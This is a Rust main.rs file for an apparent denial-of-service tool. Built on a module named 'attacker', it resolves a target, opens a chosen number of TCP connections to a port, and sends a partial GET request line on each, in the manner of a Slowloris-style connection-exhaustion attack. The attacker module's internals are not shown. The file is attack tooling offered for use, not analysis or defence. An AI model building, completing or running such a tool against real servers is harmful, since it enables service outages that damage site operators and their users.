mod arg_parser;
mod attacker;

use std::net::TcpStream;

use arg_parser::{Args, Parser};

fn main() {
    // Parse arguments
    let args = Args::parse();

    // Resolve addresses
    println!("[*] Resolving address");
    let addr = match attacker::resolve_address(args.target) {
        Ok(a) => a,
        Err(_) => {
            println!("[!] Error resolving address"); 
            std::process::exit(1);
        },
    };

    // Create connections
    println!("[*] Creating {} connections", args.socket_num);
    let streams: Vec<TcpStream>;
    match attacker::make_connections(addr, args.port, args.socket_num) {
        Ok(s) => {
            println!("[*] Connections successful");
            streams = s;
        }
        Err(e) => {
            println!("[!] Errors have occurred:");
            for i in e {
                println!("[!] ---- {}", i);
            }
            std::process::exit(1);
        }
    };

    // Send intial GET request line
    for mut stream in streams {
        match attacker::prepare_stream(&mut stream) {
            Ok(_) => (),
            Err(e) => {
                println!("[!] Error while preparing stream ---- {}", e);
                std::process::exit(1);
            }
        }
    }
}
